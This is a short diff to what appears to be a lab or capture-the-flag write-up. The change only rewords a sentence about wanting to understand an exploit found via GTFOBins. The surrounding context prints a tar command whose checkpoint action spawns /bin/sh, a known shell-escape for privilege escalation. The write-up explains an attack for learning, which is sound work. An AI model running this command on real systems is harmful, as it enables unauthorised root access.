@@ -137,7 +137,9 @@ I then went on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) to check if 
 
 ---
 
-Instead of being a scr1pt k1dd13, I wanted to understand how the exploit works. The command used in the exploit is as follows:
+Instead of being a scr1pt k1dd13, I wanted to understand how the exploit works! 
+
+The exploit uses the following command:
 
 ```
 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
